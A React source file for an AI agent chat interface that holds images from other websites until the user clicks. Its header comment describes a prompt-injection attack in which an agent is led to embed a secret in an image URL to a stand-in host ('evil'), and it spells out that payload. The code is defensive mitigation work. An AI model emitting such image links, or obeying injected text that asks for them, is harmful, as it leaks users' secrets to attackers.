// An image in an agent's reply. Pictures from somora itself (generated
// media, files by path, data: URIs) show at once. A picture from another
// website waits for a click: loading it tells that website the address,
// and an address can carry anything the agent was talked into putting
// there (prompt injection → `![](https://evil/p?d=<secret>)`). "Always
// show" brings back loading at once, for this browser (web and mobile
// share it).

import { useState, type CSSProperties } from 'react';

const ALWAYS_KEY = 'somora.chat.externalImages';

/** Absolute filesystem paths agents emit for local files. */
export const FILESYSTEM_PATH_RE = /^(~|\/(home|Users|var|opt|tmp|etc|mnt|root))(\/|$)/;

/** Where the browser loads `src` from: filesystem paths go through
 *  /files/raw, which applies the file_read policy. */
export function chatImageUrl(src: string | undefined): string | undefined {
  return src && FILESYSTEM_PATH_RE.test(src) ? `/files/raw?path=${encodeURIComponent(src)}` : src;
}

/** The host of a URL on another website, or null for somora's own. */
export function foreignImageHost(url: string, ownOrigin: string): string | null {
  if (/^(data|blob):/i.test(url)) return null;
  let u: URL;
  try {
    u = new URL(url, ownOrigin);
  } catch {
    return null;
  }
  return u.origin === ownOrigin ? null : u.host || u.protocol;
}

function alwaysShow(): boolean {
  try {
    return window.localStorage.getItem(ALWAYS_KEY) === '1';
  } catch {
    return false;
  }
}

export function ChatImage({ src, alt, maxHeight }: { src?: string; alt?: string; maxHeight: number }) {
  const url = chatImageUrl(src);
  const host = url ? foreignImageHost(url, window.location.origin) : null;
  const [shown, setShown] = useState(() => host === null || alwaysShow());
  const style: CSSProperties = { maxWidth: '100%', maxHeight, borderRadius: 6, cursor: 'pointer' };

  if (!shown) {
    return (
      <span className="chat-image-held" title={url}>
        <span>{`Image from ${host}`}</span>{' '}
        <button type="button" onClick={() => setShown(true)}>Show</button>{' '}
        <button
          type="button"
          onClick={() => {
            try {
              window.localStorage.setItem(ALWAYS_KEY, '1');
            } catch {
              /* this view only */
            }
            setShown(true);
          }}
        >
          Always show
        </button>
      </span>
    );
  }
  return (
    <a href={url} target="_blank" rel="noopener noreferrer">
      <img src={url} alt={alt ?? ''} referrerPolicy="no-referrer" style={style} />
    </a>
  );
}
